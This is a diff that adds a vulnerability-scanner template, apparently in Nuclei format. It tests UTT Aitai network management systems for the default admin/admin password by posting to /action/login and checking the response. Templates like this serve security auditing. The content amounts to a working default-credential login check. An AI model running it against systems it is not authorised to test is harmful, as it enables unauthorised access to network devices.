@@ -1,0 +1,28 @@
+id: poc-yaml-utt-aitai-net-weak-pass
+info:
+  name: UTT艾泰网络管理系统弱口令漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: weak-password
+
+variables:
+  username: admin
+  password: admin
+
+http:
+  - raw:
+      - |
+        POST /action/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{password}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "var time=0;var leftPwdNums=0"
